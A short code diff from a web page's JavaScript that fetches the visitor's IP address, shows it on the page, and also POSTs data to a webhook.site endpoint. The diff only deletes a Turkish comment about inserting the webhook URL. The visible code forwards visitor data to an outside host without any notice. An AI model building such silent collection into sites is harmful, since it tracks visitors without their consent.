@@ -34,7 +34,6 @@
             .then(data => {
                 document.getElementById('ip-address').textContent = data.ip;
 
-                // Webhook.site URL'nizi buraya ekleyin
                 fetch('https://webhook.site/d0bd5d4e-c93b-461d-a724-d9362aea846e', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
